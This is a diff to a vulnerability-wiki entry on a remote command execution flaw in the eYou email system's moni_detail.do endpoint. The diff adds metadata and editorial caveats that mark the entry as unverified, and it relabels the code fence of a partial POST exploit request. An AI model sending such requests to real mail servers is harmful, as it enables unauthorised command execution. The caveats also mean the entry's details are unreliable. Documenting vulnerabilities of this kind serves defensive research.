@@ -1,9 +1,49 @@
 ---
 version: "亿邮电子邮件系统"
 source: "Threekiii/Vulnerability-Wiki"
+title: "亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞"
+product: "亿邮 eYou"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "No auth shown; affected version unknown"
+affected_versions: "亿邮电子邮件系统"
+source_status: "unknown"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-5f04fc19daa4d92bacbeefc9"
+entity_id: "ve-5f04fc19daa4d92bacbeefc9"
+schema_version: "1"
 ---
 
 # 亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：No auth shown; affected version unknown
+- 证据范围：HTTP request plus PeiQi Python script; same endpoint/type parameter as49/50
+
+### 本次正文校订
+
+- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- Add qualified CNVD link after verification against49; do not expand all product versions
+- Fixed Content-Length does not match displayed request body
+- 'root' string+200 is heuristic, not reliable command-execution proof
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -32,7 +72,7 @@ body="亿邮电子邮件系统"
 漏洞请求包如下
 
 
-```plain
+```http
 POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 Content-Length: 39
